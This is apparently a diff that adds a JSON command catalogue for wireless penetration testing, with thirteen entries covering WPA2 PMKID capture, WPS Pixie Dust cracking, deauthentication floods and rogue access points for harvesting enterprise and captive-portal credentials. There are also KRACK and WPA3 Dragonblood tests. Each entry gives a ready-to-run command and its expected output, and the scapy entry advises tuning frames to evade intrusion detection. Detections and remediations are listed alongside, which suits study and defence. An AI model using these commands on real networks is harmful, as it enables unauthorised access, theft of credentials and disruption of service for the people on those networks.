@@ -1,0 +1,657 @@
+[
+  {
+    "id": "aircrack-pmkid",
+    "tool": "hcxdumptool",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1 --filterlist_ap=<bssid> --filtermode=2",
+    "name": "PMKID Capture (Clientless WPA Attack)",
+    "description": "Captures PMKID from AP without needing a connected client \u2014 faster than handshake capture.",
+    "arguments": {
+      "--enable_status=1": "Show status",
+      "-o": "Output file",
+      "--filterlist_ap": "Target BSSID"
+    },
+    "expected_output": "[FOUND PMKID] BSSID: AA:BB:CC:DD:EE:FF",
+    "use_case": "Attack WPA2 networks without waiting for client handshake \u2014 works on most modern APs.",
+    "prerequisites": [
+      "Monitor mode adapter",
+      "hcxdumptool installed"
+    ],
+    "mitre_mapping": [
+      "T1040"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Monitor mode activity",
+      "Unusual management frames"
+    ],
+    "remediation": [
+      "Use WPA3",
+      "Disable PMKID in AP firmware"
+    ],
+    "common_mistakes": [
+      "AP doesn't support PMKID"
+    ],
+    "alternatives": [
+      "hcxtools",
+      "aircrack-ng"
+    ],
+    "references": [
+      "https://hashcat.net/forum/thread-7717.html"
+    ],
+    "tags": [
+      "pmkid",
+      "wpa2",
+      "clientless",
+      "wireless",
+      "hashcat"
+    ]
+  },
+  {
+    "id": "airgeddon-all",
+    "tool": "airgeddon",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "bash airgeddon.sh",
+    "name": "Airgeddon (All-in-One Wireless)",
+    "description": "Menu-driven wireless attack framework \u2014 WPA/WPA2 cracking, evil twin, DoS, WPS attacks.",
+    "arguments": {},
+    "expected_output": "[*] Select attack: 1) Handshake 2) PMKID 3) Evil Twin 4) WPS",
+    "use_case": "All-in-one wireless testing when you need multiple attack types.",
+    "prerequisites": [
+      "Wireless adapter",
+      "aircrack-ng suite"
+    ],
+    "mitre_mapping": [
+      "T1557"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Monitor mode",
+      "Deauth frames"
+    ],
+    "remediation": [
+      "WPA3",
+      "802.1X",
+      "WIDS"
+    ],
+    "common_mistakes": [
+      "Wrong adapter selected"
+    ],
+    "alternatives": [
+      "wifite",
+      "fluxion"
+    ],
+    "references": [
+      "https://github.com/v1s1t0r1sh3r3/airgeddon"
+    ],
+    "tags": [
+      "airgeddon",
+      "wireless",
+      "all-in-one",
+      "menu",
+      "framework"
+    ]
+  },
+  {
+    "id": "kismet-passive",
+    "tool": "kismet",
+    "category": "wireless",
+    "phase": 1,
+    "os": [
+      "linux"
+    ],
+    "command": "kismet -c wlan0",
+    "name": "Kismet Passive Wireless Recon",
+    "description": "Passively monitors all wireless traffic \u2014 discovers networks, clients, and probes without transmitting.",
+    "arguments": {
+      "-c wlan0": "Capture source"
+    },
+    "expected_output": "SSID: CorpNet (WPA2) BSSID: AA:BB:CC:DD:EE:FF Ch:6\nClient: 11:22:33:44:55:66 probing for 'HomeWiFi'",
+    "use_case": "Passive wireless reconnaissance \u2014 completely undetectable.",
+    "prerequisites": [
+      "Wireless adapter"
+    ],
+    "mitre_mapping": [
+      "T1040"
+    ],
+    "mitre_tactic": "Discovery",
+    "detections": [
+      "Cannot detect passive monitoring"
+    ],
+    "remediation": [
+      "N/A \u2014 passive only"
+    ],
+    "common_mistakes": [
+      "Missing packets due to channel hopping"
+    ],
+    "alternatives": [
+      "airodump-ng",
+      "wireshark"
+    ],
+    "references": [
+      "https://www.kismetwireless.net"
+    ],
+    "tags": [
+      "kismet",
+      "passive",
+      "wireless",
+      "recon",
+      "undetectable"
+    ]
+  },
+  {
+    "id": "reaver-wps",
+    "tool": "reaver",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "reaver -i wlan0mon -b <bssid> -vv -K 1",
+    "name": "WPS Pixie Dust Attack",
+    "description": "Exploits WPS implementation flaws to recover WPA password in seconds (Pixie Dust).",
+    "arguments": {
+      "-b": "Target BSSID",
+      "-K 1": "Pixie Dust attack",
+      "-vv": "Verbose"
+    },
+    "expected_output": "[+] WPS pin: 12345670\n[+] WPA PSK: MySecretPassword123",
+    "use_case": "Crack WPA via WPS vulnerability \u2014 works in seconds if AP is vulnerable.",
+    "prerequisites": [
+      "Monitor mode",
+      "WPS enabled on target"
+    ],
+    "mitre_mapping": [
+      "T1110"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "WPS authentication attempts"
+    ],
+    "remediation": [
+      "Disable WPS",
+      "Use WPS lockout"
+    ],
+    "common_mistakes": [
+      "WPS locked out",
+      "Not vulnerable to Pixie Dust"
+    ],
+    "alternatives": [
+      "bully",
+      "oneshot"
+    ],
+    "references": [
+      "https://github.com/t6x/reaver-wps-fork-t6x"
+    ],
+    "tags": [
+      "wps",
+      "pixie-dust",
+      "reaver",
+      "wireless",
+      "pin"
+    ]
+  },
+  {
+    "id": "mdk4-deauth",
+    "tool": "mdk4",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "mdk4 wlan0mon d -B <bssid>",
+    "name": "MDK4 Deauthentication Flood",
+    "description": "Sends mass deauthentication frames \u2014 more aggressive than aireplay-ng.",
+    "arguments": {
+      "d": "Deauth mode",
+      "-B": "Target BSSID"
+    },
+    "expected_output": "Sending deauth frames to AA:BB:CC:DD:EE:FF...\nClients disconnecting...",
+    "use_case": "Force all clients off a network for evil twin or handshake capture.",
+    "prerequisites": [
+      "Monitor mode adapter"
+    ],
+    "mitre_mapping": [
+      "T1499"
+    ],
+    "mitre_tactic": "Impact",
+    "detections": [
+      "Mass deauth frames",
+      "WIDS alerts"
+    ],
+    "remediation": [
+      "802.11w (PMF)",
+      "WIDS"
+    ],
+    "common_mistakes": [
+      "PMF enabled (protected management frames)"
+    ],
+    "alternatives": [
+      "aireplay-ng --deauth"
+    ],
+    "references": [
+      "https://github.com/aircrack-ng/mdk4"
+    ],
+    "tags": [
+      "deauth",
+      "dos",
+      "wireless",
+      "flood",
+      "disconnect"
+    ]
+  },
+  {
+    "id": "eaphammer-enterprise",
+    "tool": "eaphammer",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "eaphammer --bssid <bssid> --essid CorpWiFi --channel 6 --auth wpa-eap --creds",
+    "name": "EAPHammer (Enterprise WiFi Attack)",
+    "description": "Creates rogue AP for WPA-Enterprise \u2014 captures RADIUS credentials (MSCHAPv2 hashes).",
+    "arguments": {
+      "--auth wpa-eap": "Enterprise mode",
+      "--creds": "Capture credentials"
+    },
+    "expected_output": "[*] Rogue AP active: CorpWiFi\n[+] Captured: CORP\\jsmith:$MSCHAPv2$...",
+    "use_case": "Attack WPA-Enterprise networks by capturing RADIUS authentication hashes.",
+    "prerequisites": [
+      "Two wireless adapters",
+      "Hostapd-mana"
+    ],
+    "mitre_mapping": [
+      "T1557"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Duplicate SSID",
+      "Rogue RADIUS server"
+    ],
+    "remediation": [
+      "Certificate pinning",
+      "EAP-TLS",
+      "WIDS"
+    ],
+    "common_mistakes": [
+      "Clients verify server certificate"
+    ],
+    "alternatives": [
+      "hostapd-mana",
+      "wpa_sycophant"
+    ],
+    "references": [
+      "https://github.com/s0lst1c3/eaphammer"
+    ],
+    "tags": [
+      "enterprise",
+      "wpa-eap",
+      "radius",
+      "mschapv2",
+      "rogue-ap"
+    ]
+  },
+  {
+    "id": "wifi-pumpkin",
+    "tool": "wifi-pumpkin3",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "wp3 --essid FreeWiFi --proxy captiveflask",
+    "name": "WiFi-Pumpkin3 (Rogue AP Framework)",
+    "description": "Creates rogue access point with captive portal, DNS spoofing, and traffic interception.",
+    "arguments": {
+      "--essid": "Network name",
+      "--proxy captiveflask": "Captive portal proxy"
+    },
+    "expected_output": "[*] AP started: FreeWiFi\n[*] Client connected: 192.168.1.5\n[*] Credentials captured via portal",
+    "use_case": "Full rogue AP framework with modular plugins for credential capture.",
+    "prerequisites": [
+      "Two wireless adapters"
+    ],
+    "mitre_mapping": [
+      "T1557"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Rogue AP",
+      "Captive portal",
+      "DNS spoofing"
+    ],
+    "remediation": [
+      "Don't connect to open WiFi",
+      "VPN",
+      "WIDS"
+    ],
+    "common_mistakes": [
+      "No clients connect"
+    ],
+    "alternatives": [
+      "wifiphisher",
+      "fluxion"
+    ],
+    "references": [
+      "https://github.com/P0cL4bs/wifipumpkin3"
+    ],
+    "tags": [
+      "rogue-ap",
+      "captive-portal",
+      "mitm",
+      "framework",
+      "wireless"
+    ]
+  },
+  {
+    "id": "hostapd-mana",
+    "tool": "hostapd-mana",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "hostapd-mana /etc/hostapd-mana/hostapd-mana.conf",
+    "name": "Hostapd-Mana (Karma Attack)",
+    "description": "Modified hostapd that responds to all probe requests \u2014 captures clients looking for any network.",
+    "arguments": {},
+    "expected_output": "[*] Responding to probe for 'HomeWiFi' from 11:22:33:44:55:66\n[*] Client associated",
+    "use_case": "Capture clients by responding to their probe requests for remembered networks.",
+    "prerequisites": [
+      "Wireless adapter",
+      "hostapd-mana config"
+    ],
+    "mitre_mapping": [
+      "T1557"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "AP responding to all probes",
+      "Unusual SSID patterns"
+    ],
+    "remediation": [
+      "Forget saved networks",
+      "Use 802.1X"
+    ],
+    "common_mistakes": [
+      "Modern devices randomize probes"
+    ],
+    "alternatives": [
+      "wifi-pumpkin3",
+      "eaphammer"
+    ],
+    "references": [
+      "https://github.com/sensepost/hostapd-mana"
+    ],
+    "tags": [
+      "karma",
+      "probe",
+      "mana",
+      "rogue-ap",
+      "wireless"
+    ]
+  },
+  {
+    "id": "bettercap-wifi-deauth",
+    "tool": "bettercap",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "bettercap -iface wlan0mon -eval 'wifi.recon on; wifi.deauth <bssid>'",
+    "name": "Bettercap WiFi Deauth",
+    "description": "Uses bettercap for targeted WiFi deauthentication \u2014 integrated with other MITM capabilities.",
+    "arguments": {
+      "wifi.recon on": "Start WiFi recon",
+      "wifi.deauth": "Deauth target"
+    },
+    "expected_output": "[*] WiFi recon active\n[*] Deauthing clients from CorpNet",
+    "use_case": "Deauth + recon in one tool \u2014 useful when combining WiFi and network attacks.",
+    "prerequisites": [
+      "Monitor mode adapter",
+      "bettercap"
+    ],
+    "mitre_mapping": [
+      "T1499"
+    ],
+    "mitre_tactic": "Impact",
+    "detections": [
+      "Deauth frames",
+      "Monitor mode activity"
+    ],
+    "remediation": [
+      "802.11w PMF",
+      "WIDS"
+    ],
+    "common_mistakes": [
+      "PMF enabled"
+    ],
+    "alternatives": [
+      "aireplay-ng",
+      "mdk4"
+    ],
+    "references": [
+      "https://www.bettercap.org/modules/wifi/"
+    ],
+    "tags": [
+      "bettercap",
+      "deauth",
+      "wifi",
+      "recon",
+      "combined"
+    ]
+  },
+  {
+    "id": "wifite2-auto",
+    "tool": "wifite",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "wifite --kill -5ghz",
+    "name": "Wifite2 Automated WiFi Cracking",
+    "description": "Automated wireless auditing \u2014 tries WPS, PMKID, handshake capture, and cracking sequentially.",
+    "arguments": {
+      "--kill": "Kill interfering processes",
+      "-5ghz": "Include 5GHz networks"
+    },
+    "expected_output": "[+] Target: CorpNet (WPA2)\n[+] Trying PMKID... Success!\n[+] Cracking with wordlist...\n[+] KEY: Password123",
+    "use_case": "Fully automated WiFi cracking \u2014 tries all methods sequentially.",
+    "prerequisites": [
+      "Monitor mode adapter",
+      "Wordlist"
+    ],
+    "mitre_mapping": [
+      "T1110"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Monitor mode",
+      "Multiple attack attempts"
+    ],
+    "remediation": [
+      "WPA3",
+      "Strong passwords",
+      "Disable WPS"
+    ],
+    "common_mistakes": [
+      "All methods fail (strong password)"
+    ],
+    "alternatives": [
+      "airgeddon",
+      "manual aircrack-ng"
+    ],
+    "references": [
+      "https://github.com/derv82/wifite2"
+    ],
+    "tags": [
+      "wifite",
+      "automated",
+      "cracking",
+      "wpa2",
+      "all-methods"
+    ]
+  },
+  {
+    "id": "krack-test",
+    "tool": "krackattacks-scripts",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "python3 krack_all_zero_tk.py wlan0",
+    "name": "KRACK Attack Test (Key Reinstallation)",
+    "description": "Tests if WPA2 clients are vulnerable to key reinstallation attacks (CVE-2017-13077).",
+    "arguments": {
+      "wlan0": "Interface in monitor mode"
+    },
+    "expected_output": "[*] Testing client 11:22:33:44:55:66\n[!] VULNERABLE: Client reinstalled all-zero key",
+    "use_case": "Test WPA2 clients for KRACK vulnerability \u2014 allows traffic decryption.",
+    "prerequisites": [
+      "Monitor mode",
+      "Specific client connected"
+    ],
+    "mitre_mapping": [
+      "T1040"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Unusual 4-way handshake retransmissions"
+    ],
+    "remediation": [
+      "Patch clients",
+      "Use WPA3"
+    ],
+    "common_mistakes": [
+      "Client already patched"
+    ],
+    "alternatives": [
+      "vanhoefm/krackattacks-scripts"
+    ],
+    "references": [
+      "https://www.krackattacks.com"
+    ],
+    "tags": [
+      "krack",
+      "wpa2",
+      "key-reinstallation",
+      "cve",
+      "vulnerability"
+    ]
+  },
+  {
+    "id": "dragonblood-wpa3",
+    "tool": "dragonblood",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "python3 dragonslayer.py -i wlan0 -t <bssid> -s CorpNet",
+    "name": "WPA3 Dragonblood Attack",
+    "description": "Tests WPA3 SAE (Dragonfly) handshake for side-channel and downgrade vulnerabilities.",
+    "arguments": {
+      "-i": "Interface",
+      "-t": "Target BSSID",
+      "-s": "SSID"
+    },
+    "expected_output": "[*] Testing SAE handshake...\n[!] Timing side-channel detected\n[!] Downgrade to WPA2 possible",
+    "use_case": "Test WPA3 implementations for Dragonblood vulnerabilities.",
+    "prerequisites": [
+      "WPA3 network",
+      "dragonblood tools"
+    ],
+    "mitre_mapping": [
+      "T1040"
+    ],
+    "mitre_tactic": "Credential Access",
+    "detections": [
+      "Unusual SAE handshake patterns"
+    ],
+    "remediation": [
+      "Update AP firmware",
+      "Disable WPA2 fallback"
+    ],
+    "common_mistakes": [
+      "AP fully patched"
+    ],
+    "alternatives": [
+      "manual SAE testing"
+    ],
+    "references": [
+      "https://wpa3.mathyvanhoef.com"
+    ],
+    "tags": [
+      "wpa3",
+      "dragonblood",
+      "sae",
+      "downgrade",
+      "side-channel"
+    ]
+  },
+  {
+    "id": "wifi-deauth-scapy",
+    "tool": "scapy",
+    "category": "wireless",
+    "phase": 4,
+    "os": [
+      "linux"
+    ],
+    "command": "python3 -c \"from scapy.all import *; sendp(RadioTap()/Dot11(addr1='FF:FF:FF:FF:FF:FF',addr2='<bssid>',addr3='<bssid>')/Dot11Deauth(),iface='wlan0mon',count=100)\"",
+    "name": "Custom Deauth with Scapy",
+    "description": "Craft custom deauthentication frames with Scapy \u2014 full control over frame parameters.",
+    "arguments": {
+      "addr1": "Destination (broadcast)",
+      "addr2": "Source (AP)",
+      "count": "Number of frames"
+    },
+    "expected_output": "Sent 100 packets.",
+    "use_case": "Custom deauth when standard tools are detected \u2014 modify frame parameters to evade WIDS.",
+    "prerequisites": [
+      "Scapy",
+      "Monitor mode",
+      "Python"
+    ],
+    "mitre_mapping": [
+      "T1499"
+    ],
+    "mitre_tactic": "Impact",
+    "detections": [
+      "Deauth frames",
+      "Unusual frame parameters"
+    ],
+    "remediation": [
+      "802.11w PMF",
+      "WIDS with custom signatures"
+    ],
+    "common_mistakes": [
+      "PMF enabled"
+    ],
+    "alternatives": [
+      "aireplay-ng",
+      "mdk4"
+    ],
+    "references": [
+      "https://scapy.readthedocs.io"
+    ],
+    "tags": [
+      "scapy",
+      "custom",
+      "deauth",
+      "crafting",
+      "python"
+    ]
+  }
+]
